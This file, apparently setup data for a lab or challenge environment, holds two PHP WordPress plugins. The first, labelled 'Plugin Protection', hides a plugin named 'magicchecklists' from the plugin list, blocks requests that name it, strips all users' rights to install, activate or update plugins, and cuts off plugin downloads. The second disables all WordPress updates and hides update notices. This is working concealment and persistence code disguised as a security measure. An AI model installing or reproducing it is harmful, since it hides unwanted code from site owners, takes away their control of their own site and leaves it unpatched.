steps.data:
<?php
/*
Plugin Name: Plugin Protection
Description: Security measures for protecting plugins
Version: 1.0
Author: System
*/

// Block plugin operations
add_filter('user_has_cap', function($capabilities) {
    unset($capabilities['install_plugins']);
    unset($capabilities['upload_plugins']);
    unset($capabilities['activate_plugins']);
    unset($capabilities['update_plugins']);
    return $capabilities;
});

// Hide magicchecklists from plugins list
add_filter('all_plugins', function($plugins) {
    unset($plugins['magicchecklists/magicchecklists.php']);
    return $plugins;
});

// Block access to plugin download URLs
add_action('init', function() {
    global $pagenow;
    if ($pagenow === 'plugin-install.php' || $pagenow === 'update.php' || 
        (isset($_SERVER['REQUEST_URI']) && 
         (strpos($_SERVER['REQUEST_URI'], 'wp-json/wp/v2/plugins') !== false || 
          strpos($_SERVER['REQUEST_URI'], 'magicchecklists') !== false))) {
        wp_die('Access denied', 'Security Error', ['response' => 403]);
    }
});

// Disable external connections
add_filter('pre_http_request', function($pre, $parsed_args, $url) {
    if (strpos($url, 'api.wordpress.org/plugins') !== false || 
        strpos($url, 'downloads.wordpress.org/plugin') !== false) {
        return new WP_Error('http_request_failed', 'Plugin downloads are disabled');
    }
    return $pre;
}, 10, 3);

<?php
/*
Plugin Name: Disable Updates
Description: Disables all WordPress updates and notifications
Version: 1.0
Author: System
*/

// Disable all update checks
remove_action('load-update-core.php', 'wp_update_plugins');
wp_clear_scheduled_hook('wp_update_plugins');
add_filter('auto_update_plugin', '__return_false');
add_filter('auto_update_theme', '__return_false');

// Remove update menu items
add_action('admin_menu', function() {
    remove_submenu_page('index.php', 'update-core.php');
    remove_submenu_page('plugins.php', 'plugin-install.php');
});

// Disable update notifications
remove_action('admin_init', '_maybe_update_core');
remove_action('admin_init', '_maybe_update_plugins');
remove_action('admin_init', '_maybe_update_themes');

// Hide update notifications
add_action('admin_head', function() {
    remove_action('admin_notices', 'update_nag', 3);
    remove_action('admin_notices', 'maintenance_nag', 10);
});
